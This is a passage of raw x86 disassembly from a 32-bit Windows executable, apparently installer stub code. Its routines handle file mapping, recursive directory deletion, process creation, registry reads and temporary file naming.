  4060b1:	8b 0d 10 40 42 00    	mov    0x424010,%ecx
  4060b7:	83 c4 10             	add    $0x10,%esp
  4060ba:	8b e8                	mov    %eax,%ebp
  4060bc:	ff b1 28 01 00 00    	push   0x128(%ecx)
  4060c2:	56                   	push   %esi
  4060c3:	e8 3d fb ff ff       	call   0x405c05
  4060c8:	6a 04                	push   $0x4
  4060ca:	68 00 00 00 c0       	push   $0xc0000000
  4060cf:	56                   	push   %esi
  4060d0:	e8 03 05 00 00       	call   0x4065d8
  4060d5:	8b d8                	mov    %eax,%ebx
  4060d7:	83 fb ff             	cmp    $0xffffffff,%ebx
  4060da:	0f 84 82 00 00 00    	je     0x406162
  4060e0:	6a 00                	push   $0x0
  4060e2:	53                   	push   %ebx
  4060e3:	ff 15 cc 80 40 00    	call   *0x4080cc
  4060e9:	8b f0                	mov    %eax,%esi
  4060eb:	8d 4d 0a             	lea    0xa(%ebp),%ecx
  4060ee:	03 ce                	add    %esi,%ecx
  4060f0:	51                   	push   %ecx
  4060f1:	6a 40                	push   $0x40
  4060f3:	ff 15 f4 80 40 00    	call   *0x4080f4
  4060f9:	8b f8                	mov    %eax,%edi
  4060fb:	85 ff                	test   %edi,%edi
  4060fd:	74 5c                	je     0x40615b
  4060ff:	56                   	push   %esi
  406100:	57                   	push   %edi
  406101:	53                   	push   %ebx
  406102:	e8 fe 04 00 00       	call   0x406605
  406107:	85 c0                	test   %eax,%eax
  406109:	74 50                	je     0x40615b
  40610b:	68 f0 86 40 00       	push   $0x4086f0
  406110:	57                   	push   %edi
  406111:	e8 ce 06 00 00       	call   0x4067e4
  406116:	85 c0                	test   %eax,%eax
  406118:	75 4d                	jne    0x406167
  40611a:	68 f0 86 40 00       	push   $0x4086f0
  40611f:	8d 04 37             	lea    (%edi,%esi,1),%eax
  406122:	50                   	push   %eax
  406123:	ff 15 54 81 40 00    	call   *0x408154
  406129:	83 c6 0a             	add    $0xa,%esi
  40612c:	8b ce                	mov    %esi,%ecx
  40612e:	55                   	push   %ebp
  40612f:	68 48 1e 42 00       	push   $0x421e48
  406134:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  406137:	50                   	push   %eax
  406138:	e8 19 02 00 00       	call   0x406356
  40613d:	33 c0                	xor    %eax,%eax
  40613f:	50                   	push   %eax
  406140:	50                   	push   %eax
  406141:	50                   	push   %eax
  406142:	53                   	push   %ebx
  406143:	ff 15 10 81 40 00    	call   *0x408110
  406149:	8d 04 2e             	lea    (%esi,%ebp,1),%eax
  40614c:	50                   	push   %eax
  40614d:	57                   	push   %edi
  40614e:	53                   	push   %ebx
  40614f:	e8 70 05 00 00       	call   0x4066c4
  406154:	57                   	push   %edi
  406155:	ff 15 f0 80 40 00    	call   *0x4080f0
  40615b:	53                   	push   %ebx
  40615c:	ff 15 08 81 40 00    	call   *0x408108
  406162:	5f                   	pop    %edi
  406163:	5e                   	pop    %esi
  406164:	5d                   	pop    %ebp
  406165:	5b                   	pop    %ebx
  406166:	c3                   	ret
  406167:	68 04 87 40 00       	push   $0x408704
  40616c:	83 c0 0a             	add    $0xa,%eax
  40616f:	50                   	push   %eax
  406170:	e8 6f 06 00 00       	call   0x4067e4
  406175:	8b c8                	mov    %eax,%ecx
  406177:	85 c9                	test   %ecx,%ecx
  406179:	74 b1                	je     0x40612c
  40617b:	8d 14 37             	lea    (%edi,%esi,1),%edx
  40617e:	eb 06                	jmp    0x406186
  406180:	8a 02                	mov    (%edx),%al
  406182:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  406185:	4a                   	dec    %edx
  406186:	3b d1                	cmp    %ecx,%edx
  406188:	77 f6                	ja     0x406180
  40618a:	2b cf                	sub    %edi,%ecx
  40618c:	41                   	inc    %ecx
  40618d:	eb 9f                	jmp    0x40612e
  40618f:	33 c0                	xor    %eax,%eax
  406191:	50                   	push   %eax
  406192:	50                   	push   %eax
  406193:	ff 74 24 14          	push   0x14(%esp)
  406197:	ff 74 24 14          	push   0x14(%esp)
  40619b:	6a ff                	push   $0xffffffff
  40619d:	ff 74 24 18          	push   0x18(%esp)
  4061a1:	50                   	push   %eax
  4061a2:	50                   	push   %eax
  4061a3:	ff 15 48 81 40 00    	call   *0x408148
  4061a9:	c3                   	ret
  4061aa:	6a 06                	push   $0x6
  4061ac:	e8 f2 03 00 00       	call   0x4065a3
  4061b1:	85 c0                	test   %eax,%eax
  4061b3:	74 0a                	je     0x4061bf
  4061b5:	ff d0                	call   *%eax
  4061b7:	85 c0                	test   %eax,%eax
  4061b9:	74 04                	je     0x4061bf
  4061bb:	33 c0                	xor    %eax,%eax
  4061bd:	40                   	inc    %eax
  4061be:	c3                   	ret
  4061bf:	33 c0                	xor    %eax,%eax
  4061c1:	c3                   	ret
  4061c2:	55                   	push   %ebp
  4061c3:	8b ec                	mov    %esp,%ebp
  4061c5:	51                   	push   %ecx
  4061c6:	57                   	push   %edi
  4061c7:	6a 64                	push   $0x64
  4061c9:	ff 75 08             	push   0x8(%ebp)
  4061cc:	ff 15 74 80 40 00    	call   *0x408074
  4061d2:	bf 02 01 00 00       	mov    $0x102,%edi
  4061d7:	eb 12                	jmp    0x4061eb
  4061d9:	6a 0f                	push   $0xf
  4061db:	e8 95 fd ff ff       	call   0x405f75
  4061e0:	6a 64                	push   $0x64
  4061e2:	ff 75 08             	push   0x8(%ebp)
  4061e5:	ff 15 74 80 40 00    	call   *0x408074
  4061eb:	3b c7                	cmp    %edi,%eax
  4061ed:	74 ea                	je     0x4061d9
  4061ef:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4061f2:	50                   	push   %eax
  4061f3:	ff 75 08             	push   0x8(%ebp)
  4061f6:	ff 15 b4 80 40 00    	call   *0x4080b4
  4061fc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4061ff:	5f                   	pop    %edi
  406200:	c9                   	leave
  406201:	c2 04 00             	ret    $0x4
  406204:	56                   	push   %esi
  406205:	8b 74 24 08          	mov    0x8(%esp),%esi
  406209:	56                   	push   %esi
  40620a:	ff 15 a0 80 40 00    	call   *0x4080a0
  406210:	03 c6                	add    %esi,%eax
  406212:	50                   	push   %eax
  406213:	56                   	push   %esi
  406214:	ff 15 70 82 40 00    	call   *0x408270
  40621a:	80 38 5c             	cmpb   $0x5c,(%eax)
  40621d:	74 0c                	je     0x40622b
  40621f:	68 98 82 40 00       	push   $0x408298
  406224:	56                   	push   %esi
  406225:	ff 15 58 81 40 00    	call   *0x408158
  40622b:	8b c6                	mov    %esi,%eax
  40622d:	5e                   	pop    %esi
  40622e:	c2 04 00             	ret    $0x4
  406231:	55                   	push   %ebp
  406232:	8b ec                	mov    %esp,%ebp
  406234:	57                   	push   %edi
  406235:	ff 75 08             	push   0x8(%ebp)
  406238:	e8 0e 06 00 00       	call   0x40684b
  40623d:	8b f8                	mov    %eax,%edi
  40623f:	83 ff ff             	cmp    $0xffffffff,%edi
  406242:	74 30                	je     0x406274
  406244:	f6 45 0c 01          	testb  $0x1,0xc(%ebp)
  406248:	ff 75 08             	push   0x8(%ebp)
  40624b:	74 08                	je     0x406255
  40624d:	ff 15 78 80 40 00    	call   *0x408078
  406253:	eb 06                	jmp    0x40625b
  406255:	ff 15 2c 81 40 00    	call   *0x40812c
  40625b:	85 c0                	test   %eax,%eax
  40625d:	74 05                	je     0x406264
  40625f:	33 c0                	xor    %eax,%eax
  406261:	40                   	inc    %eax
  406262:	eb 12                	jmp    0x406276
  406264:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  406268:	75 0a                	jne    0x406274
  40626a:	57                   	push   %edi
  40626b:	ff 75 08             	push   0x8(%ebp)
  40626e:	ff 15 14 81 40 00    	call   *0x408114
  406274:	33 c0                	xor    %eax,%eax
  406276:	5f                   	pop    %edi
  406277:	5d                   	pop    %ebp
  406278:	c2 08 00             	ret    $0x8
  40627b:	56                   	push   %esi
  40627c:	be 48 2a 42 00       	mov    $0x422a48,%esi
  406281:	56                   	push   %esi
  406282:	ff 74 24 0c          	push   0xc(%esp)
  406286:	ff 15 24 81 40 00    	call   *0x408124
  40628c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40628f:	74 0b                	je     0x40629c
  406291:	50                   	push   %eax
  406292:	ff 15 28 81 40 00    	call   *0x408128
  406298:	8b c6                	mov    %esi,%eax
  40629a:	eb 02                	jmp    0x40629e
  40629c:	33 c0                	xor    %eax,%eax
  40629e:	5e                   	pop    %esi
  40629f:	c2 04 00             	ret    $0x4
  4062a2:	8b 44 24 04          	mov    0x4(%esp),%eax
  4062a6:	8a 08                	mov    (%eax),%cl
  4062a8:	84 c9                	test   %cl,%cl
  4062aa:	74 17                	je     0x4062c3
  4062ac:	53                   	push   %ebx
  4062ad:	8a 5c 24 0c          	mov    0xc(%esp),%bl
  4062b1:	3a cb                	cmp    %bl,%cl
  4062b3:	74 0d                	je     0x4062c2
  4062b5:	50                   	push   %eax
  4062b6:	ff 15 f4 81 40 00    	call   *0x4081f4
  4062bc:	8a 08                	mov    (%eax),%cl
  4062be:	84 c9                	test   %cl,%cl
  4062c0:	75 ef                	jne    0x4062b1
  4062c2:	5b                   	pop    %ebx
  4062c3:	c2 08 00             	ret    $0x8
  4062c6:	ff 74 24 08          	push   0x8(%esp)
  4062ca:	68 68 85 40 00       	push   $0x408568
  4062cf:	ff 74 24 0c          	push   0xc(%esp)
  4062d3:	ff 15 44 82 40 00    	call   *0x408244
  4062d9:	83 c4 0c             	add    $0xc,%esp
  4062dc:	c2 08 00             	ret    $0x8
  4062df:	53                   	push   %ebx
  4062e0:	56                   	push   %esi
  4062e1:	ff 74 24 0c          	push   0xc(%esp)
  4062e5:	bb 48 1a 42 00       	mov    $0x421a48,%ebx
  4062ea:	53                   	push   %ebx
  4062eb:	e8 d8 04 00 00       	call   0x4067c8
  4062f0:	53                   	push   %ebx
  4062f1:	e8 7d 05 00 00       	call   0x406873
  4062f6:	8b f0                	mov    %eax,%esi
  4062f8:	85 f6                	test   %esi,%esi
  4062fa:	74 53                	je     0x40634f
  4062fc:	56                   	push   %esi
  4062fd:	e8 a9 06 00 00       	call   0x4069ab
  406302:	f6 05 0c 40 42 00 80 	testb  $0x80,0x42400c
  406309:	74 0a                	je     0x406315
  40630b:	8a 06                	mov    (%esi),%al
  40630d:	84 c0                	test   %al,%al
  40630f:	74 3e                	je     0x40634f
  406311:	3c 5c                	cmp    $0x5c,%al
  406313:	74 3a                	je     0x40634f
  406315:	2b f3                	sub    %ebx,%esi
  406317:	eb 14                	jmp    0x40632d
  406319:	e8 5d ff ff ff       	call   0x40627b
  40631e:	85 c0                	test   %eax,%eax
  406320:	74 05                	je     0x406327
  406322:	f6 00 10             	testb  $0x10,(%eax)
  406325:	74 28                	je     0x40634f
  406327:	53                   	push   %ebx
  406328:	e8 53 06 00 00       	call   0x406980
  40632d:	53                   	push   %ebx
  40632e:	ff 15 a0 80 40 00    	call   *0x4080a0
  406334:	53                   	push   %ebx
  406335:	3b c6                	cmp    %esi,%eax
  406337:	7f e0                	jg     0x406319
  406339:	e8 c6 fe ff ff       	call   0x406204
  40633e:	53                   	push   %ebx
  40633f:	ff 15 1c 81 40 00    	call   *0x40811c
  406345:	83 f8 ff             	cmp    $0xffffffff,%eax
  406348:	74 05                	je     0x40634f
  40634a:	33 c0                	xor    %eax,%eax
  40634c:	40                   	inc    %eax
  40634d:	eb 02                	jmp    0x406351
  40634f:	33 c0                	xor    %eax,%eax
  406351:	5e                   	pop    %esi
  406352:	5b                   	pop    %ebx
  406353:	c2 04 00             	ret    $0x4
  406356:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40635a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40635e:	85 d2                	test   %edx,%edx
  406360:	74 13                	je     0x406375
  406362:	56                   	push   %esi
  406363:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406367:	2b f1                	sub    %ecx,%esi
  406369:	8a 04 0e             	mov    (%esi,%ecx,1),%al
  40636c:	88 01                	mov    %al,(%ecx)
  40636e:	41                   	inc    %ecx
  40636f:	83 ea 01             	sub    $0x1,%edx
  406372:	75 f5                	jne    0x406369
  406374:	5e                   	pop    %esi
  406375:	c2 0c 00             	ret    $0xc
  406378:	55                   	push   %ebp
  406379:	8b ec                	mov    %esp,%ebp
  40637b:	83 ec 10             	sub    $0x10,%esp
  40637e:	c7 05 00 16 42 00 44 	movl   $0x44,0x421600
  406385:	00 00 00 
  406388:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40638b:	50                   	push   %eax
  40638c:	68 00 16 42 00       	push   $0x421600
  406391:	33 c0                	xor    %eax,%eax
  406393:	50                   	push   %eax
  406394:	50                   	push   %eax
  406395:	68 00 00 00 04       	push   $0x4000000
  40639a:	50                   	push   %eax
  40639b:	50                   	push   %eax
  40639c:	50                   	push   %eax
  40639d:	ff 75 08             	push   0x8(%ebp)
  4063a0:	50                   	push   %eax
  4063a1:	ff 15 44 81 40 00    	call   *0x408144
  4063a7:	85 c0                	test   %eax,%eax
  4063a9:	74 0c                	je     0x4063b7
  4063ab:	ff 75 f4             	push   -0xc(%ebp)
  4063ae:	ff 15 08 81 40 00    	call   *0x408108
  4063b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4063b7:	c9                   	leave
  4063b8:	c2 04 00             	ret    $0x4
  4063bb:	81 ec 50 01 00 00    	sub    $0x150,%esp
  4063c1:	53                   	push   %ebx
  4063c2:	8b 9c 24 5c 01 00 00 	mov    0x15c(%esp),%ebx
  4063c9:	56                   	push   %esi
  4063ca:	8b b4 24 5c 01 00 00 	mov    0x15c(%esp),%esi
  4063d1:	57                   	push   %edi
  4063d2:	8b fb                	mov    %ebx,%edi
  4063d4:	56                   	push   %esi
  4063d5:	83 e7 04             	and    $0x4,%edi
  4063d8:	e8 02 ff ff ff       	call   0x4062df
  4063dd:	89 44 24 18          	mov    %eax,0x18(%esp)
  4063e1:	f6 c3 08             	test   $0x8,%bl
  4063e4:	74 17                	je     0x4063fd
  4063e6:	56                   	push   %esi
  4063e7:	ff 15 2c 81 40 00    	call   *0x40812c
  4063ed:	f7 d8                	neg    %eax
  4063ef:	1b c0                	sbb    %eax,%eax
  4063f1:	40                   	inc    %eax
  4063f2:	01 05 c8 40 42 00    	add    %eax,0x4240c8
  4063f8:	e9 9a 01 00 00       	jmp    0x406597
  4063fd:	55                   	push   %ebp
  4063fe:	8b eb                	mov    %ebx,%ebp
  406400:	83 e5 01             	and    $0x1,%ebp
  406403:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406407:	74 11                	je     0x40641a
  406409:	85 c0                	test   %eax,%eax
  40640b:	0f 84 75 01 00 00    	je     0x406586
  406411:	f6 c3 02             	test   $0x2,%bl
  406414:	0f 84 36 01 00 00    	je     0x406550
  40641a:	56                   	push   %esi
  40641b:	68 48 16 42 00       	push   $0x421648
  406420:	e8 a3 03 00 00       	call   0x4067c8
  406425:	85 ed                	test   %ebp,%ebp
  406427:	8b 2d 58 81 40 00    	mov    0x408158,%ebp
  40642d:	74 0e                	je     0x40643d
  40642f:	68 e8 86 40 00       	push   $0x4086e8
  406434:	68 48 16 42 00       	push   $0x421648
  406439:	ff d5                	call   *%ebp
  40643b:	eb 06                	jmp    0x406443
  40643d:	56                   	push   %esi
  40643e:	e8 3d 05 00 00       	call   0x406980
  406443:	80 3e 00             	cmpb   $0x0,(%esi)
  406446:	75 09                	jne    0x406451
  406448:	80 3d 48 16 42 00 5c 	cmpb   $0x5c,0x421648
  40644f:	75 08                	jne    0x406459
  406451:	68 98 82 40 00       	push   $0x408298
  406456:	56                   	push   %esi
  406457:	ff d5                	call   *%ebp
  406459:	56                   	push   %esi
  40645a:	ff 15 a0 80 40 00    	call   *0x4080a0
  406460:	8d 2c 06             	lea    (%esi,%eax,1),%ebp
  406463:	8d 44 24 20          	lea    0x20(%esp),%eax
  406467:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40646b:	50                   	push   %eax
  40646c:	68 48 16 42 00       	push   $0x421648
  406471:	ff 15 24 81 40 00    	call   *0x408124
  406477:	89 44 24 14          	mov    %eax,0x14(%esp)
  40647b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40647e:	0f 84 ba 00 00 00    	je     0x40653e
  406484:	8d 6c 24 4c          	lea    0x4c(%esp),%ebp
  406488:	6a 3f                	push   $0x3f
  40648a:	8b c5                	mov    %ebp,%eax
  40648c:	50                   	push   %eax
  40648d:	e8 10 fe ff ff       	call   0x4062a2
  406492:	80 38 00             	cmpb   $0x0,(%eax)
  406495:	74 14                	je     0x4064ab
  406497:	80 bc 24 50 01 00 00 	cmpb   $0x0,0x150(%esp)
  40649e:	00 
  40649f:	8d 84 24 50 01 00 00 	lea    0x150(%esp),%eax
  4064a6:	0f 44 c5             	cmove  %ebp,%eax
  4064a9:	8b e8                	mov    %eax,%ebp
  4064ab:	80 7d 00 2e          	cmpb   $0x2e,0x0(%ebp)
  4064af:	75 11                	jne    0x4064c2
  4064b1:	8a 45 01             	mov    0x1(%ebp),%al
  4064b4:	84 c0                	test   %al,%al
  4064b6:	74 61                	je     0x406519
  4064b8:	3c 2e                	cmp    $0x2e,%al
  4064ba:	75 06                	jne    0x4064c2
  4064bc:	80 7d 02 00          	cmpb   $0x0,0x2(%ebp)
  4064c0:	74 57                	je     0x406519
  4064c2:	55                   	push   %ebp
  4064c3:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4064c7:	55                   	push   %ebp
  4064c8:	e8 fb 02 00 00       	call   0x4067c8
  4064cd:	f6 44 24 20 10       	testb  $0x10,0x20(%esp)
  4064d2:	74 12                	je     0x4064e6
  4064d4:	8b c3                	mov    %ebx,%eax
  4064d6:	83 e0 03             	and    $0x3,%eax
  4064d9:	3c 03                	cmp    $0x3,%al
  4064db:	75 40                	jne    0x40651d
  4064dd:	53                   	push   %ebx
  4064de:	56                   	push   %esi
  4064df:	e8 d7 fe ff ff       	call   0x4063bb
  4064e4:	eb 37                	jmp    0x40651d
  4064e6:	57                   	push   %edi
  4064e7:	56                   	push   %esi
  4064e8:	e8 44 fd ff ff       	call   0x406231
  4064ed:	85 c0                	test   %eax,%eax
  4064ef:	75 1e                	jne    0x40650f
  4064f1:	85 ff                	test   %edi,%edi
  4064f3:	74 12                	je     0x406507
  4064f5:	56                   	push   %esi
  4064f6:	6a f1                	push   $0xfffffff1
  4064f8:	e8 65 f5 ff ff       	call   0x405a62
  4064fd:	6a 00                	push   $0x0
  4064ff:	56                   	push   %esi
  406500:	e8 9e fa ff ff       	call   0x405fa3
  406505:	eb 16                	jmp    0x40651d
  406507:	ff 05 c8 40 42 00    	incl   0x4240c8
  40650d:	eb 0e                	jmp    0x40651d
  40650f:	56                   	push   %esi
  406510:	6a f2                	push   $0xfffffff2
  406512:	e8 4b f5 ff ff       	call   0x405a62
  406517:	eb 04                	jmp    0x40651d
  406519:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  40651d:	8d 44 24 20          	lea    0x20(%esp),%eax
  406521:	50                   	push   %eax
  406522:	ff 74 24 18          	push   0x18(%esp)
  406526:	ff 15 20 81 40 00    	call   *0x408120
  40652c:	85 c0                	test   %eax,%eax
  40652e:	0f 85 50 ff ff ff    	jne    0x406484
  406534:	ff 74 24 14          	push   0x14(%esp)
  406538:	ff 15 28 81 40 00    	call   *0x408128
  40653e:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  406543:	74 51                	je     0x406596
  406545:	83 7c 24 1c 00       	cmpl   $0x0,0x1c(%esp)
  40654a:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  40654e:	74 36                	je     0x406586
  406550:	56                   	push   %esi
  406551:	e8 25 fd ff ff       	call   0x40627b
  406556:	85 c0                	test   %eax,%eax
  406558:	74 3c                	je     0x406596
  40655a:	56                   	push   %esi
  40655b:	e8 a4 fc ff ff       	call   0x406204
  406560:	8b c7                	mov    %edi,%eax
  406562:	83 c8 01             	or     $0x1,%eax
  406565:	50                   	push   %eax
  406566:	56                   	push   %esi
  406567:	e8 c5 fc ff ff       	call   0x406231
  40656c:	85 c0                	test   %eax,%eax
  40656e:	75 1e                	jne    0x40658e
  406570:	85 ff                	test   %edi,%edi
  406572:	74 12                	je     0x406586
  406574:	56                   	push   %esi
  406575:	6a f1                	push   $0xfffffff1
  406577:	e8 e6 f4 ff ff       	call   0x405a62
  40657c:	6a 00                	push   $0x0
  40657e:	56                   	push   %esi
  40657f:	e8 1f fa ff ff       	call   0x405fa3
  406584:	eb 10                	jmp    0x406596
  406586:	ff 05 c8 40 42 00    	incl   0x4240c8
  40658c:	eb 08                	jmp    0x406596
  40658e:	56                   	push   %esi
  40658f:	6a e5                	push   $0xffffffe5
  406591:	e8 cc f4 ff ff       	call   0x405a62
  406596:	5d                   	pop    %ebp
  406597:	5f                   	pop    %edi
  406598:	5e                   	pop    %esi
  406599:	5b                   	pop    %ebx
  40659a:	81 c4 50 01 00 00    	add    $0x150,%esp
  4065a0:	c2 08 00             	ret    $0x8
  4065a3:	56                   	push   %esi
  4065a4:	57                   	push   %edi
  4065a5:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4065a9:	8b 34 fd 30 a0 40 00 	mov    0x40a030(,%edi,8),%esi
  4065b0:	56                   	push   %esi
  4065b1:	ff 15 fc 80 40 00    	call   *0x4080fc
  4065b7:	85 c0                	test   %eax,%eax
  4065b9:	75 0a                	jne    0x4065c5
  4065bb:	56                   	push   %esi
  4065bc:	e8 47 f9 ff ff       	call   0x405f08
  4065c1:	85 c0                	test   %eax,%eax
  4065c3:	74 0e                	je     0x4065d3
  4065c5:	ff 34 fd 34 a0 40 00 	push   0x40a034(,%edi,8)
  4065cc:	50                   	push   %eax
  4065cd:	ff 15 50 81 40 00    	call   *0x408150
  4065d3:	5f                   	pop    %edi
  4065d4:	5e                   	pop    %esi
  4065d5:	c2 04 00             	ret    $0x4
  4065d8:	ff 74 24 04          	push   0x4(%esp)
  4065dc:	ff 15 1c 81 40 00    	call   *0x40811c
  4065e2:	33 c9                	xor    %ecx,%ecx
  4065e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4065e7:	6a 00                	push   $0x0
  4065e9:	0f 44 c1             	cmove  %ecx,%eax
  4065ec:	50                   	push   %eax
  4065ed:	ff 74 24 14          	push   0x14(%esp)
  4065f1:	51                   	push   %ecx
  4065f2:	6a 01                	push   $0x1
  4065f4:	ff 74 24 1c          	push   0x1c(%esp)
  4065f8:	ff 74 24 1c          	push   0x1c(%esp)
  4065fc:	ff 15 80 80 40 00    	call   *0x408080
  406602:	c2 0c 00             	ret    $0xc
  406605:	55                   	push   %ebp
  406606:	8b ec                	mov    %esp,%ebp
  406608:	51                   	push   %ecx
  406609:	56                   	push   %esi
  40660a:	57                   	push   %edi
  40660b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40660e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406611:	33 f6                	xor    %esi,%esi
  406613:	56                   	push   %esi
  406614:	50                   	push   %eax
  406615:	57                   	push   %edi
  406616:	ff 75 0c             	push   0xc(%ebp)
  406619:	ff 75 08             	push   0x8(%ebp)
  40661c:	ff 15 7c 80 40 00    	call   *0x40807c
  406622:	85 c0                	test   %eax,%eax
  406624:	74 06                	je     0x40662c
  406626:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  406629:	75 01                	jne    0x40662c
  40662b:	46                   	inc    %esi
  40662c:	5f                   	pop    %edi
  40662d:	8b c6                	mov    %esi,%eax
  40662f:	5e                   	pop    %esi
  406630:	c9                   	leave
  406631:	c2 0c 00             	ret    $0xc
  406634:	55                   	push   %ebp
  406635:	8b ec                	mov    %esp,%ebp
  406637:	51                   	push   %ecx
  406638:	51                   	push   %ecx
  406639:	57                   	push   %edi
  40663a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40663d:	c7 45 f8 00 04 00 00 	movl   $0x400,-0x8(%ebp)
  406644:	50                   	push   %eax
  406645:	8b 45 18             	mov    0x18(%ebp),%eax
  406648:	f7 d8                	neg    %eax
  40664a:	1b c0                	sbb    %eax,%eax
  40664c:	25 00 01 00 00       	and    $0x100,%eax
  406651:	0d 19 00 02 00       	or     $0x20019,%eax
  406656:	50                   	push   %eax
  406657:	ff 75 0c             	push   0xc(%ebp)
  40665a:	ff 75 08             	push   0x8(%ebp)
  40665d:	e8 a6 f9 ff ff       	call   0x406008
  406662:	8b 7d 14             	mov    0x14(%ebp),%edi
  406665:	85 c0                	test   %eax,%eax
  406667:	75 3b                	jne    0x4066a4
  406669:	56                   	push   %esi
  40666a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40666d:	50                   	push   %eax
  40666e:	57                   	push   %edi
  40666f:	8d 45 18             	lea    0x18(%ebp),%eax
  406672:	50                   	push   %eax
  406673:	6a 00                	push   $0x0
  406675:	ff 75 10             	push   0x10(%ebp)
  406678:	ff 75 fc             	push   -0x4(%ebp)
  40667b:	ff 15 14 80 40 00    	call   *0x408014
  406681:	ff 75 fc             	push   -0x4(%ebp)
  406684:	8b f0                	mov    %eax,%esi
  406686:	ff 15 00 80 40 00    	call   *0x408000
  40668c:	85 f6                	test   %esi,%esi
  40668e:	c6 87 ff 03 00 00 00 	movb   $0x0,0x3ff(%edi)
  406695:	5e                   	pop    %esi
  406696:	75 0c                	jne    0x4066a4
  406698:	83 7d 18 01          	cmpl   $0x1,0x18(%ebp)
  40669c:	74 09                	je     0x4066a7
  40669e:	83 7d 18 02          	cmpl   $0x2,0x18(%ebp)
  4066a2:	74 03                	je     0x4066a7
  4066a4:	c6 07 00             	movb   $0x0,(%edi)
  4066a7:	5f                   	pop    %edi
  4066a8:	c9                   	leave
  4066a9:	c2 14 00             	ret    $0x14
  4066ac:	8b 44 24 04          	mov    0x4(%esp),%eax
  4066b0:	50                   	push   %eax
  4066b1:	83 60 24 00          	andl   $0x0,0x24(%eax)
  4066b5:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  4066bb:	ff 15 78 81 40 00    	call   *0x408178
  4066c1:	c2 04 00             	ret    $0x4
  4066c4:	55                   	push   %ebp
  4066c5:	8b ec                	mov    %esp,%ebp
  4066c7:	51                   	push   %ecx
  4066c8:	56                   	push   %esi
  4066c9:	57                   	push   %edi
  4066ca:	8b 7d 10             	mov    0x10(%ebp),%edi
  4066cd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4066d0:	33 f6                	xor    %esi,%esi
  4066d2:	56                   	push   %esi
  4066d3:	50                   	push   %eax
  4066d4:	57                   	push   %edi
  4066d5:	ff 75 0c             	push   0xc(%ebp)
  4066d8:	ff 75 08             	push   0x8(%ebp)
  4066db:	ff 15 40 81 40 00    	call   *0x408140
  4066e1:	85 c0                	test   %eax,%eax
  4066e3:	74 06                	je     0x4066eb
  4066e5:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  4066e8:	75 01                	jne    0x4066eb
  4066ea:	46                   	inc    %esi
  4066eb:	5f                   	pop    %edi
  4066ec:	8b c6                	mov    %esi,%eax
  4066ee:	5e                   	pop    %esi
  4066ef:	c9                   	leave
  4066f0:	c2 0c 00             	ret    $0xc
  4066f3:	68 00 04 00 00       	push   $0x400
  4066f8:	ff 74 24 0c          	push   0xc(%esp)
  4066fc:	ff 74 24 0c          	push   0xc(%esp)
  406700:	ff 35 dc 37 42 00    	push   0x4237dc
  406706:	ff 15 64 82 40 00    	call   *0x408264
  40670c:	c2 08 00             	ret    $0x8
  40670f:	55                   	push   %ebp
  406710:	8b ec                	mov    %esp,%ebp
  406712:	56                   	push   %esi
  406713:	8b 75 08             	mov    0x8(%ebp),%esi
  406716:	57                   	push   %edi
  406717:	6a 64                	push   $0x64
  406719:	5f                   	pop    %edi
  40671a:	4f                   	dec    %edi
  40671b:	c7 45 08 6e 73 61 00 	movl   $0x61736e,0x8(%ebp)
  406722:	ff 15 c8 80 40 00    	call   *0x4080c8
  406728:	6a 1a                	push   $0x1a
  40672a:	59                   	pop    %ecx
  40672b:	33 d2                	xor    %edx,%edx
  40672d:	f7 f1                	div    %ecx
  40672f:	56                   	push   %esi
  406730:	00 55 0a             	add    %dl,0xa(%ebp)
  406733:	8d 45 08             	lea    0x8(%ebp),%eax
  406736:	6a 00                	push   $0x0
  406738:	50                   	push   %eax
  406739:	ff 75 0c             	push   0xc(%ebp)
  40673c:	ff 15 6c 80 40 00    	call   *0x40806c
  406742:	85 c0                	test   %eax,%eax
  406744:	75 08                	jne    0x40674e
  406746:	85 ff                	test   %edi,%edi
  406748:	75 d0                	jne    0x40671a
  40674a:	88 06                	mov    %al,(%esi)
  40674c:	eb 02                	jmp    0x406750
  40674e:	8b c6                	mov    %esi,%eax
  406750:	5f                   	pop    %edi
  406751:	5e                   	pop    %esi
  406752:	5d                   	pop    %ebp
  406753:	c2 08 00             	ret    $0x8
  406756:	8b 44 24 08          	mov    0x8(%esp),%eax
  40675a:	8b c8                	mov    %eax,%ecx
  40675c:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  406762:	83 3d e0 40 42 00 00 	cmpl   $0x0,0x4240e0
  406769:	74 07                	je     0x406772
  40676b:	c1 e8 15             	shr    $0x15,%eax
  40676e:	85 c0                	test   %eax,%eax
  406770:	75 47                	jne    0x4067b9
  406772:	83 3d e8 40 42 00 00 	cmpl   $0x0,0x4240e8
  406779:	74 06                	je     0x406781
  40677b:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  406781:	a1 f8 37 42 00       	mov    0x4237f8,%eax
  406786:	a3 a4 a0 40 00       	mov    %eax,0x40a0a4
  40678b:	a1 f4 37 42 00       	mov    0x4237f4,%eax
  406790:	a3 a8 a0 40 00       	mov    %eax,0x40a0a8
  406795:	8b 44 24 04          	mov    0x4(%esp),%eax
  406799:	68 a0 a0 40 00       	push   $0x40a0a0
